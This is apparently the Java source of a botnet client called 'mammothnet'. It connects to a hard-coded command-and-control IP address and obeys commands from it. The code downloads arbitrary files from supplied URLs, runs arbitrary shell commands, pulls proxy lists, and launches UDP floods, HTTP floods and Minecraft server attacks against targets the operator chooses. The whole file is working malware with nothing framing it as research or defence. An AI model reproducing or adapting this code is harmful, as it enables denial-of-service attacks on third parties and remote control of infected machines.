package com.turbokot.mammothnet;

import java.io.*;
import java.net.*;
import java.util.Arrays;

import com.turbokot.httpflood.HTTPFLOOD;
import com.turbokot.udpflood.UDPFLOOD;

public class Main {
    public static void main(String[] args) {
        System.setProperty("file.encoding", "UTF-8");

        while (true) {
            Socket soc = null;
            DataInputStream in = null;

            try {
                soc = new Socket("46.250.227.218", 25792);
                in = new DataInputStream(soc.getInputStream());

                while (true) {
                    try {
                        String message = in.readUTF();
                        String[] cmd_parts = message.split(" ");
                        String command = cmd_parts[0];
                        String[] cmd_args = Arrays.copyOfRange(cmd_parts, 1, cmd_parts.length);

                        switch (command) {
                            case "download":
                                try {
                                    String filename = cmd_args[0];
                                    String downloadurl = cmd_args[1];

                                    URL url = new URL(downloadurl);
                                    URLConnection connection = url.openConnection();
                                    InputStream inputStream = connection.getInputStream();

                                    FileOutputStream outputStream = new FileOutputStream(filename);

                                    int bytesRead;
                                    byte[] buffer = new byte[1024];
                                    while ((bytesRead = inputStream.read(buffer)) != -1) {
                                        outputStream.write(buffer, 0, bytesRead);
                                    }

                                    inputStream.close();
                                    outputStream.close();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                break;
                            case "update-proxies":
                                try {
                                    String url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all";

                                    HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                                    connection.setRequestMethod("GET");
                                    BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"));
                                    StringBuilder response = new StringBuilder();
                                    String line;
                                    while ((line = reader.readLine()) != null) {
                                        response.append(line).append('\n');
                                    }
                                    reader.close();

                                    String proxies = response.toString();

                                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream("proxies.txt"), "UTF-8"));
                                    writer.write(proxies);
                                    writer.close();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                break;
                            case "shell":
                                try {
                                    ProcessBuilder processBuilder = new ProcessBuilder(cmd_args);
                                    processBuilder.start();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                                break;
                            case "attack":
                                switch (cmd_args[0]) {
                                    case "MINECRAFT":
                                        new Thread(() -> {
                                            try {
                                                Runtime.getRuntime().exec("java -jar bungeecord.jar " + cmd_args[1] + " " + cmd_args[4] + " " + cmd_args[3].toLowerCase() + " " + cmd_args[7] + " " + cmd_args[5] + " " + cmd_args[6] + " y");
                                            } catch (IOException e) {
                                                throw new RuntimeException(e);
                                            }
                                        }).start();
                                        break;
                                    case "L4":
                                        UDPFLOOD.ip = cmd_args[1];
                                        UDPFLOOD.port = Integer.parseInt(cmd_args[2]);
                                        UDPFLOOD.duration = Integer.parseInt(cmd_args[4]);
                                        UDPFLOOD.run();
                                        break;
                                    case "L7":
                                        HTTPFLOOD.host = cmd_args[1];
                                        HTTPFLOOD.duration = Integer.valueOf(cmd_args[3]);
                                        HTTPFLOOD.run();
                                        break;
                                }
                        }
                    } catch (SocketException se) {
                        System.out.println("Connection reset. Reconnecting...");
                        break;
                    } catch (Throwable e) {
                        throw new RuntimeException(e);
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
                try {
                    System.out.println("Reconnecting..");
                    Thread.sleep(30000);
                } catch (InterruptedException ex) {
                    ex.printStackTrace();
                } finally {
                    try {
                        if (in != null) in.close();
                        if (soc != null) soc.close();
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }
        }
    }
}
